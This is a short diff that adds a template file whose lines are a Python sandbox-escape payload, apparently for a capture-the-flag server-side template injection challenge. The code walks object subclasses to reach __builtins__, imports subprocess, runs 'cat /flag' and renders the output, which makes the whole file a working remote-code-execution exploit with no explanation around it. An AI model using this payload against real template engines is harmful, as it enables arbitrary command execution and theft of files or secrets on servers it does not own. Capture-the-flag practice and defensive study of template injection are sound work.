@@ -1,0 +1,5 @@
+% 
+% x = []
+% [x.append(c) for c in [].__class__.__base__.__subclasses__() if 'warning' in str(c)]
+% y = x[0].__init__.__globals__['__builtins__']['__import__']('subprocess').getoutput('cat /flag')
+{{y}}
